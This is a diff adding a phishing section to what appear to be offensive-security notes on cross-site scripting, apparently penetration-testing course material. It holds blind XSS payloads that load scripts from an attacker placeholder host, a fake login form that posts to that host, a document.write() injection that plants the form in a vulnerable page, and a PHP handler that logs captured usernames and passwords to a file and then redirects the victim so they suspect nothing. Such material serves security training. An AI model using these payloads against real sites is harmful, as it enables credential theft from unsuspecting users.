@@ -108,6 +108,45 @@ So:
 <script src=http://OUR_IP/fullname></script> #this goes inside the full-name field
 <script src=http://OUR_IP/username></script> #this goes inside the username field
 ```
+# Phishing
+HTML code for basic login form:
+```
+<h3>Please login to continue</h3>
+<form action=http://OUR_IP>
+    <input type="username" name="username" placeholder="Username">
+    <input type="password" name="password" placeholder="Password">
+    <input type="submit" name="submit" value="Login">
+</form>
+```
+```
+<div>
+<h3>Please login to continue</h3>
+<input type="text" placeholder="Username">
+<input type="text" placeholder="Password">
+<input type="submit" value="Login">
+<br><br>
+</div>
+```
+To write HTML code to the vulnerable page, we can use the `document.write()` JavaScript function:
+```
+document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
+```
+We can use `document.getElementById().remove()` or `<!--` at the end to clean up the look of the page and make the login more believable.
+
+After that spin up our listening web server and we can put this `index.php` file in the webroot to save the credentials nicely:
+```
+<?php
+if (isset($_GET['username']) && isset($_GET['password'])) {
+    $file = fopen("creds.txt", "a+");
+    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
+    header("Location: http://SERVER_IP/phishing/index.php");
+    fclose($file);
+    exit();
+}
+?>
+```
+*Note: After submitting the creds, the user will be redirected to the page itself, so the victim thinks that he/she just logged in.*
+
 # Session Hijacking
 As usual, we can use [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss):
 ```
